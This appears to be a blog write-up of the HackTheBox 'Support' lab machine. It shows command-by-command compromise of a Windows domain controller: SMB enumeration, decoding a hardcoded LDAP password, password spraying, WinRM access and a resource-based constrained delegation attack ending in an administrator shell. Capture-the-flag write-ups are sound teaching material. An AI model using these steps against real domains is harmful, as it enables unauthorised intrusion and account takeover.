<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="google-site-verification" content="UnJN0X8aSA7Vas0N6FhAFn-PjFV-OU0wZh9gGAnWM0o"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Support" /><meta property="og:locale" content="en" /><meta name="description" content="title: HTB | Support author: Zeropio date: 2022-08-28 categories: [Pentesting, HackTheBox] tags: [htb, windows, easy, machines] permalink: /pentesting/htb/machines/support image: path: /assets/img/hackthebox/card/Support.png width: 800 height: 500 —" /><meta property="og:description" content="title: HTB | Support author: Zeropio date: 2022-08-28 categories: [Pentesting, HackTheBox] tags: [htb, windows, easy, machines] permalink: /pentesting/htb/machines/support image: path: /assets/img/hackthebox/card/Support.png width: 800 height: 500 —" /><link rel="canonical" href="congkhainguyen.github.io/posts/Support/" /><meta property="og:url" content="congkhainguyen.github.io/posts/Support/" /><meta property="og:site_name" content="Kaiba_404’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-28T00:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Support" /><meta name="twitter:site" content="@giangkhail12999" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-12-30T18:24:35+01:00","datePublished":"2022-08-28T00:00:00+02:00","description":"title: HTB | Support author: Zeropio date: 2022-08-28 categories: [Pentesting, HackTheBox] tags: [htb, windows, easy, machines] permalink: /pentesting/htb/machines/support image: path: /assets/img/hackthebox/card/Support.png width: 800 height: 500 —","headline":"Support","mainEntityOfPage":{"@type":"WebPage","@id":"congkhainguyen.github.io/posts/Support/"},"url":"congkhainguyen.github.io/posts/Support/"}</script><title>Support | Kaiba_404's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Kaiba_404's Blog"><meta name="application-name" content="Kaiba_404's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/icon.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Kaiba_404's Blog</a></div><div class="site-subtitle font-italic">CyberSec Student</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fa fa-list ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/sources/" class="nav-link"> <i class="fa-fw fa fa-globe ml-xl-3 mr-xl-3 unloaded"></i> <span>SOURCES</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fa fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fa fa-user ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/CongKhaiNGUYEN" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://app.hackthebox.com/profile/380109" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <a href="https://twitter.com/giangkhail12999" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Support</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Support</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1661637600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 28, 2022 </em> </span> <span> Updated <em class="" data-ts="1672421075" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 30, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/giangkhail12999">Cong Khai NGUYEN</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="914 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><hr /><p>title: HTB | Support author: Zeropio date: 2022-08-28 categories: [Pentesting, HackTheBox] tags: [htb, windows, easy, machines] permalink: /pentesting/htb/machines/support image: path: /assets/img/hackthebox/card/Support.png width: 800 height: 500 —</p><h1 id="footprinting">Footprinting</h1><p>The nmap provides us with:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-28 15:40:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
58047/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-28T15:40:59
|_  start_date: N/A
|_clock-skew: 1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
</pre></table></code></div></div><h2 id="rpc"><span class="mr-2">RPC</span><a href="#rpc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can star a <code class="language-plaintext highlighter-rouge">rpcclient</code> on the DC:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 10.10.11.174
<span class="gp">rpcclient $</span><span class="o">&gt;</span> querydominfo
<span class="go">result was NT_STATUS_ACCESS_DENIED
</span><span class="gp">rpcclient $</span><span class="o">&gt;</span> getdompwinfo
<span class="go">result was NT_STATUS_ACCESS_DENIED
</span><span class="gp">rpcclient $</span><span class="o">&gt;</span> enumdomusers
<span class="go">result was NT_STATUS_ACCESS_DENIED
</span></pre></table></code></div></div><p>We can access but doesn’t have rights to get anything. We can run <code class="language-plaintext highlighter-rouge">enum4linux</code> to get some info, but only got that:</p><ul><li>Some usernames: administrator, guest, krbtgt, domain admins, root, bin, none<li>Server 10.10.11.174 allows sessions using username ‘’, password ‘’<li>Domain Name: SUPPORT<li>Host is part of a domain (not a workgroup)</ul><h2 id="smb"><span class="mr-2">SMB</span><a href="#smb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can list the SMB contents:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>smbclient <span class="nt">-N</span> <span class="nt">-L</span> <span class="se">\\\\</span>10.10.11.174
<span class="go">
        Sharename       Type      Comment
        ---------       ----      -------
</span><span class="gp">        ADMIN$</span><span class="w">          </span>Disk      Remote Admin
<span class="gp">        C$</span><span class="w">              </span>Disk      Default share
<span class="gp">        IPC$</span><span class="w">            </span>IPC       Remote IPC
<span class="go">        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share
</span></pre></table></code></div></div><p>We cannot connect to <strong>NETLOGON</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>smbclient <span class="nt">-N</span> <span class="se">\\\\</span>10.10.11.174<span class="se">\\</span>NETLOGON
<span class="go">Try "help" to get a list of possible commands.
</span><span class="gp">smb: \&gt;</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">NT_STATUS_ACCESS_DENIED listing \*
</span></pre></table></code></div></div><p>But we can connect to <strong>support-tools</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>smbclient <span class="nt">-N</span> <span class="se">\\\\</span>10.10.11.174<span class="se">\\</span>support-tools
<span class="go">Try "help" to get a list of possible commands.
</span><span class="gp">smb: \&gt;</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">  .                                   D        0  Wed Jul 20 18:01:06 2022
  ..                                  D        0  Sat May 28 12:18:25 2022
</span></pre></table></code></div></div><p>We can see some zips files. Let’s see what are in them.</p><h1 id="foothold">Foothold</h1><p>We can use <strong>dnSpy</strong> to see the code of the <strong>UserInfo.exe</strong> we got in the smb. We see a <strong>Protected</strong> file that contains a key and the way to decode the password. We can use Python to get the password:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>python3
<span class="gp">&gt;</span><span class="o">&gt;&gt;</span> enc_password <span class="o">=</span> b<span class="s2">"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"</span>
<span class="gp">&gt;</span><span class="o">&gt;&gt;</span> key <span class="o">=</span> b<span class="s2">"armando"</span>
<span class="gp">&gt;</span><span class="o">&gt;&gt;</span> import <span class="nb">base64</span>
<span class="gp">&gt;</span><span class="o">&gt;&gt;</span> array <span class="o">=</span> base64.b64decode<span class="o">(</span>enc_password<span class="o">)</span>
<span class="gp">&gt;</span><span class="o">&gt;&gt;</span> array2 <span class="o">=</span> <span class="o">[]</span>
<span class="gp">&gt;</span><span class="o">&gt;&gt;</span> <span class="k">for </span>i <span class="k">in </span>range<span class="o">(</span>len<span class="o">(</span>array<span class="o">))</span>:
<span class="go">...     array2.append(chr(array[i] ^ key[i % len(key)] ^ 223))
</span><span class="c">... 
</span><span class="gp">&gt;</span><span class="o">&gt;&gt;</span> print<span class="o">(</span><span class="s2">""</span>.join<span class="o">(</span>array2<span class="o">))</span>
<span class="gp">nvEfEK16^1aM4$</span>e7AclUf8x<span class="nv">$tRWxPWO1</span>%lmz
</pre></table></code></div></div><p>Now we can use <code class="language-plaintext highlighter-rouge">ldapsearch</code> with the password:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>ldapsearch <span class="nt">-D</span> support<span class="se">\\</span>ldap <span class="nt">-H</span> ldap://10.10.11.174 <span class="nt">-w</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> <span class="nt">-b</span> <span class="s1">'CN=Users,DC=support,DC=htb'</span>
</pre></table></code></div></div><p>We get a bunch of information. We can get a password in a info field as <code class="language-plaintext highlighter-rouge">info: Ironside47pleasure40Watchful</code> . We can do a password spray with the users we got in this output. First, filter by them:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>ldapsearch <span class="nt">-D</span> support<span class="se">\\</span>ldap <span class="nt">-H</span> ldap://10.10.11.174 <span class="nt">-w</span> <span class="s1">'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'</span> <span class="nt">-b</span> <span class="s1">'CN=Users,DC=support,DC=htb'</span> | <span class="nb">grep </span>name: | <span class="nb">sed</span> <span class="s1">'s/^name: //'</span> | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s1">'D|C|A|U'</span>
</pre></table></code></div></div><p>Add them to a list and use crackmapexec:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>crackmapexec smb 10.10.11.174 <span class="nt">-u</span> valid_users <span class="nt">-p</span> <span class="s2">"Ironside47pleasure40Watchful"</span>
<span class="go">
SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful
</span></pre></table></code></div></div><p>We can connect now:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>evil-winrm <span class="nt">-i</span> 10.10.11.174 <span class="nt">-u</span> support <span class="nt">-p</span> <span class="s2">"Ironside47pleasure40Watchful"</span>
</pre></table></code></div></div><h1 id="privilege-escalation">Privilege Escalation</h1><p>We can check the privileges of our user:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">*Evil-WinRM* PS C:\Users\support\Desktop&gt;</span><span class="w"> </span>Import-Module .<span class="se">\P</span>owerView.ps1
<span class="gp">*Evil-WinRM* PS C:\Users\support\Desktop&gt;</span><span class="w"> </span>Get-ObjectAcl <span class="nt">-SamAccountName</span> support <span class="nt">-ResolveGUIDs</span>
</pre></table></code></div></div><p>We can see that we have <strong>GenericAll</strong> privileges. Let’s use it to create a new user:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">*Evil-WinRM* PS C:\Users\support\Desktop&gt;</span><span class="w"> </span>Import-Module .<span class="se">\P</span>owerView.ps1
<span class="gp">*Evil-WinRM* PS C:\Users\support\Desktop&gt;</span><span class="w"> </span><span class="nv">$password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'SecurePass1'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
<span class="gp">*Evil-WinRM* PS C:\Users\support\Desktop&gt;</span><span class="w"> </span>New-MachineAccount <span class="nt">-MachineAccount</span> hacker <span class="nt">-Password</span> <span class="nv">$password</span> <span class="nt">-Verbose</span>
<span class="go">Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
</span><span class="gp">Verbose: [+] SAMAccountName = hacker$</span><span class="w">
</span><span class="go">Verbose: [+] Distinguished Name = CN=hacker,CN=Computers,DC=support,DC=htb
[+] Machine account hacker added
</span></pre></table></code></div></div><p>Now we need to get the SID:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">*Evil-WinRM* PS C:\Users\support\Documents&gt;</span><span class="w"> </span>Get-DomainComputer hacker
<span class="go">
pwdlastset             : 8/28/2022 9:49:09 AM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=hacker,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : hacker
objectsid              : S-1-5-21-1677581083-3380853377-188903654-5103
</span><span class="gp">samaccountname         : hacker$</span><span class="w">
</span></pre></table></code></div></div><p>Now, with the SID, let’s add the privileges to the account to request TGT tickets:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">*Evil-WinRM* PS C:\Users\support\Documents&gt;</span><span class="w"> </span><span class="nv">$SD</span> <span class="o">=</span> New-Object Security.AccessControl.RawSecurityDescriptor <span class="nt">-ArgumentList</span> <span class="s2">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5103)"</span>
<span class="gp">*Evil-WinRM* PS C:\Users\support\Documents&gt;</span><span class="w"> </span><span class="nv">$SDBytes</span> <span class="o">=</span> New-Object byte[] <span class="o">(</span><span class="nv">$SD</span>.BinaryLength<span class="o">)</span>
<span class="gp">*Evil-WinRM* PS C:\Users\support\Documents&gt;</span><span class="w"> </span><span class="nv">$SD</span>.GetBinaryForm<span class="o">(</span><span class="nv">$SDBytes</span>, 0<span class="o">)</span>
<span class="gp">*Evil-WinRM* PS C:\Users\support\Documents&gt;</span><span class="w"> </span>Get-DomainComputer dc | Set-DomainObject <span class="nt">-Set</span> @<span class="o">{</span><span class="s1">'msds-allowedtoactonbehalfofotheridentity'</span><span class="o">=</span><span class="nv">$SDBytes</span><span class="o">}</span>
</pre></table></code></div></div><p>Use the user from the Linux host to request a ticket:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>impacket-getST support.htb/hacker:SecurePass1 <span class="nt">-dc-ip</span> 10.10.11.174 <span class="nt">-impersonate</span> administrator <span class="nt">-spn</span> www/dc.support.htb
</pre></table></code></div></div><p>Export the ticket and use <code class="language-plaintext highlighter-rouge">wmiexec</code> to get the shell:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
<span class="gp">zero@pio$</span><span class="w"> </span>impacket-wmiexec support.htb/administrator@dc.support.htb <span class="nt">-no-pass</span> <span class="nt">-k</span>
<span class="go">
</span><span class="gp">C:\&gt;</span><span class="nb">whoami</span>
<span class="go">support\administrator
</span></pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Support+-+Kaiba_404%27s+Blog&url=congkhainguyen.github.io%2Fposts%2FSupport%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Support+-+Kaiba_404%27s+Blog&u=congkhainguyen.github.io%2Fposts%2FSupport%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=congkhainguyen.github.io%2Fposts%2FSupport%2F&text=Support+-+Kaiba_404%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/ctf-like/reversing/crackme-packed">Reversing | CrackMe Packed</a><li><a href="/index">Index</a><li><a href="/malware/development/dropper-explorer-1">MalDev | Dropper Explorer.exe</a><li><a href="/malware/development/putty-1">MalDev | Putty</a><li><a href="/pentesting/htb/machines/arctic">HTB | Arctic</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/medium/">medium</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/malware/">malware</a> <a class="post-tag" href="/tags/hard/">hard</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/welcome-to-jekyll/"><div class="card-body"> <em class="small" data-ts="1679616000" data-df="ll" > Mar 24, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Welcome to Jekyll!</h3><div class="text-muted small"><p> You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run je...</p></div></div></a></div><div class="card"> <a href="/ctf-like/reversing/crackme-packed"><div class="card-body"> <em class="small" data-ts="1677625200" data-df="ll" > Mar 1, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reversing | CrackMe Packed</h3><div class="text-muted small"><p> This challenge is from Ricardo Narvaja! You can download it here. The objective is to find the real code execute inside the packer. Initial Analysis Opening the PE in x32dbg show the following ...</p></div></div></a></div><div class="card"> <a href="/malware/development/dropper-explorer-1"><div class="card-body"> <em class="small" data-ts="1675206000" data-df="ll" > Feb 1, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MalDev | Dropper Explorer.exe</h3><div class="text-muted small"><p> From a Dropper.exe, it will extract a shellcode from the .rsrc and inject it into the Explorer.exe. For this we will need: The C++ file A Resource Script file A C/C++ Header A Python scrip...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/pentesting/htb/machines/outdated" class="btn btn-outline-primary" prompt="Older"><p>HTB | Oudated</p></a> <a href="/pentesting/htb/machines/trick" class="btn btn-outline-primary" prompt="Newer"><p>HTB | Trick</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/giangkhail12999">Cong Khai NGUYEN</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" rel="noopener">Jekyll</a> with <a href="#" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" 